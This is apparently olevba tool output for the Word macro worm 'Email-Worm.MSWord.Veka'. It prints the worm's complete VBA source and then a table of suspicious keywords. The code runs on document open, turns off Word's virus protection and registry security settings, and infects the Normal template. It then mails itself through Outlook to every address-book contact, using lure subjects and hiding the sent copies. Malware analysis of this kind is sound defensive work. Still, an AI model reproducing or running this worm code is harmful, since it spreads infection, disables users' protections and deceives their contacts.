olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Veka
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Email-Worm.MSWord.Veka 
in file: Email-Worm.MSWord.Veka - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Veka by Kefi
' Kefi@Africamail.com
' http://vx.netlux.org/~kefi

Sub AutoOpen()
Call Veka
End Sub
Sub Veka()
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
Call InfectWord
Call Mail
End Sub
Sub InfectWord()
On Error Resume Next
Set norm = NormalTemplate.VBProject.VBComponents
Set doc = ActiveDocument.VBProject.VBComponents
ModSrc = "C:\kefi.drv"
If norm.Item("Veka").Name <> "AutoSpread" Then
    doc("Veka").Export ModSrc
    norm.Import ModSrc
End If
If doc.Item("Veka").Name <> "AutoSpread" Then
    norm("Veka").Export ModSrc
    doc.Import ModSrc
    ActiveDocument.Save
End If
Kill (ModSrc)
End Sub
Sub Mail()
On Error Resume Next
Dim RndMail As Integer
Dim Out, Attach, Subject, Body As String
Out = "Outlook.Application"
Set appOut = CreateObject(Out)
Out = "Outlook"
If appOut = Out Then
         Set Maper = appOut.GetNameSpace("MAPI")
         For Each Addy In Maper.AddressLists
                  If Addy.AddressEntries.Count <> 0 Then
                           For x = 1 To Addy.AddressEntries.Count
                                    RndMail = Int(Rnd * 6) + 1
                                    If RndMail = 1 Then
                                             Attach = "mp3 lists.doc"
                                             Subject = "Hey, want free mp3's?"
                                             Body = "Hey, I found a new site with a ton of free" & vbCrLf & "mp3's to download. Check it out!"
                                    ElseIf RndMail = 2 Then
                                             Attach = "AntiVirus.doc"
                                             Subject = "Antivruses are fake"
                                             Body = "I just found this surfing the web. It's really intresting."
                                    ElseIf RndMail = 3 Then
                                             Attach = "porn sites.doc"
                                             Subject = "great free porn"
                                             Body = "Want some great free porn? I have a list of sites in the attachment!"
                                    ElseIf RndMail = 4 Then
                                             Attach = "blonde jokes.doc"
                                             Subject = "Fwd: Great jokes"
                                             Body = "Check out these great blonde jokes!"
                                    ElseIf RndMail = 5 Then
                                             Attach = "Report.doc"
                                             Subject = "My report"
                                             Body = "Will you please look over my report" & vbCrLf & "and tell me about errors, and mis-spellings?"
                                    ElseIf RndMail = 6 Then
                                             Attach = "search.doc"
                                             Subject = "A ton of search engines"
                                             Body = "This has like 300 search engines in it!" & vbCrLf & "All of which are free, and better than Google!"
                                    End If
                                    Set AddEnt = Addy.AddressEntries(x)
                                    Set Mailer = appOut.CreateItem(0)
                                    Mailer.To = AddEnt.Address
                                    Mailer.Subject = (Subject)
                                    Mailer.Body = (Body)
                                    Mailer.Attachments.Add ActiveDocument.FullName, 1, 1, Attach 'AlcoPaul's attachment masking trick :o)
                                    Mailer.DeleteAfterSubmit = True
                                    If Mailer.To <> "" Then
                                             Mailer.Send
                                    End If
                           Next
                  End If
         Next
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://vx.netlux.org|URL                                          |
|          |/~kefi              |                                             |
+----------+--------------------+---------------------------------------------+

